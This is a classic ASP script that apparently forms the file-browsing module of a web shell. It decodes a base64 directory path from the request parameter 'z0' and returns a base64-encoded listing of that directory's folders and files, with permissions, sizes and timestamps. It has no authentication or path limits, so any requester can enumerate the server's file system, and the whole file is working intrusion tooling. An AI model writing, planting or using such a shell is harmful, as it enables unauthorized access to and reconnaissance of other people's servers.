<%

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    ' If Response.CharSet is empty, map it based on Session.CodePage
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8" ' Default safe fallback
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()

    Base64Decode = stream.ReadText
    stream.Close
    Set stream = Nothing : Set node = Nothing : Set xml = Nothing
End Function

Function Base64Encode(str)
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 2 ' adTypeText
    stream.Charset = GetCurrentCharset()
    stream.Open
    stream.WriteText str
    stream.Position = 0
    stream.Type = 1
    
    node.nodeTypedValue = stream.Read
    Base64Encode = Replace(node.text, vbLf, "") ' Clean up any line breaks
    
    stream.Close
    Set stream = Nothing : Set node = Nothing : Set xml = Nothing
End Function

Function fnDatetimeConversion(dt)
    fnDatetimeConversion = Year(dt) & "-" & Right("0" & Month(dt),2) & "-" & Right("0" & Day(dt),2) & " " & _
                           Right("0" & Hour(dt),2) & ":" & Right("0" & Minute(dt),2) & ":" & Right("0" & Second(dt),2)
End Function

Function fnPermission(item)
    Dim attr, p
    attr = item.Attributes
    p = "Read"

    If (attr And 1) = 1 Then
        p = p & ""
    Else
        p = p & ",Write"
    End If

    If Typename(item) = "File" Then
        If LCase(Right(item.Name, 4)) = ".exe" Or LCase(Right(item.Name, 3)) = ".bat" Or LCase(Right(item.Name, 3)) = ".cmd" Then
            p = p & ",Execute"
        End If
    End If

    fnPermission = p
End Function

Dim szDir, fso, folder, subFolder, file, aResult, szb64Name
Dim szPerm, nLength, ctime, mtime, atime

szDir = Base64Decode(Request("z0"))
szDir = Replace(szDir, "/", "\")

Set fso = Server.CreateObject("Scripting.FileSystemObject")

If Not fso.FolderExists(szDir) Then
    Response.Write "ERROR://Unable to open directory"
    Response.Write szDir
    Response.End
End If

Set folder = fso.GetFolder(szDir)
aResult = ""

For Each subFolder In folder.SubFolders
    szb64Name = Base64Encode("/" & subFolder.Name)
    szPerm = fnPermission(subFolder)
    nLength = 0 ' Folders don't have a reliable single property size without recalculating
    
    ctime = fnDatetimeConversion(subFolder.DateCreated)
    mtime = fnDatetimeConversion(subFolder.DateLastModified)
    atime = fnDatetimeConversion(subFolder.DateLastAccessed)
    
    If aResult <> "" Then aResult = aResult & "|"
    aResult = aResult & szb64Name & "?" & szPerm & "?" & nLength & "?" & ctime & "?" & mtime & "?" & atime
Next

For Each file In folder.Files
    szb64Name = Base64Encode(file.Name)
    szPerm = fnPermission(file)
    nLength = file.Size
    
    ctime = fnDatetimeConversion(file.DateCreated)
    mtime = fnDatetimeConversion(file.DateLastModified)
    atime = fnDatetimeConversion(file.DateLastAccessed)
    
    If aResult <> "" Then aResult = aResult & "|"
    aResult = aResult & szb64Name & "?" & szPerm & "?" & nLength & "?" & ctime & "?" & mtime & "?" & atime
Next

Response.Write aResult

Set folder = Nothing
Set fso = Nothing

%>